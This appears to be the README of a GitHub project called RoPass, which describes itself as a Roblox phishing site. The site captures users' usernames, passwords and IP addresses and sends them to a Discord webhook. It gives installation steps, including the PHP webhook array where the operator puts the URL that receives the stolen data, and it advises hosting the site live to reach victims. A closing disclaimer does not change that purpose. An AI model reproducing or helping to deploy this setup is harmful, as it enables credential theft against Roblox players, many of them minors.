<p align="center">
<img src="https://i.imgur.com/wyqErIg.png">
</p>

[![HTML5](https://img.shields.io/badge/HTML-5-orange.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5)
[![CSS3](https://img.shields.io/badge/CSS-3-blue.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/CSS)
[![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow.svg?style=flat-square)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
[![PHP](https://img.shields.io/badge/PHP-7.4-blue.svg?style=flat-square)](https://www.php.net/)
![OS](https://img.shields.io/badge/Tested%20On-Windows%20|%20Android-yellowgreen.svg?style=flat-square)
[![License](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](https://github.com/yourusername/phishing-site/blob/main/LICENSE)

## 🌐 RoPass
RoPass website is a Roblox phishing site designed to collect informations from users, including their usernames, passwords, and IP addresses, which are then sent to a Discord webhook.

## ⭐ Features
- **Data Collection**: Captures usernames, passwords, and IP addresses from users.
- **Discord Webhook**: Sends collected data directly to a specified Discord webhook.

## 💻 Installation

1. **Clone the Repository**: Download the source code by cloning the repository:
   ```bash
   git clone https://github.com/dtbsisco/ropass.git

3. **Modify the Discord Webhook**: Open the PHP file where the webhook is defined. Find the following line and replace `YOUR_WEBHOOK_URL_HERE` with your actual Discord webhook URL:
   ```bash
       $webhookUrls = [
        'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE',  // Replace with your actual Discord webhook URL
    ];

2. **Start Apache**: Before opening the website, ensure that Apache is running.
   - On Windows, you can use [XAMPP](https://www.apachefriends.org/).
   - On Linux, run `sudo systemctl start apache2` or `service apache2 start` in the terminal to start the built-in Apache server.
   - Note: Need to configure the directory as necessary.

3. **Open the Website**: After Apache is running, type `localhost` in a browser.

4. **Hosting the Website**: If you wish to share the website with others, you will need to host it on a live server.

5. **Requirements**: There are no additional requirements. The website uses native HTML, CSS, and JavaScript. Ensure you have an active internet connection for third-party resources like FontAwesome and jQuery.

## 📌 Screenshot
![Discord](https://i.imgur.com/Fqdaw68.png)
![Showcase](https://i.imgur.com/bzi1WFQ.png)

## ❗ Disclaimer
The use of RoPass to attack targets without prior mutual consent is strictly illegal and can result in severe legal consequences. It is the responsibility of the end user to ensure compliance with all applicable local, state, and federal laws regarding unauthorized access and cyber activities. Users must understand that any violation of these laws can lead to significant penalties, including fines and imprisonment.

The developers of RoPass disclaim any liability for misuse or damage caused by this program. By using RoPass, you acknowledge that you are fully responsible for your actions and the consequences that may arise from them. We strongly encourage users to act ethically and responsibly, always seeking proper authorization before attempting to access or compromise any systems or data.

## 📜 License
RoPass is licensed under the [MIT License](https://github.com/dtbsisco/RoPass/blob/main/LICENSE).
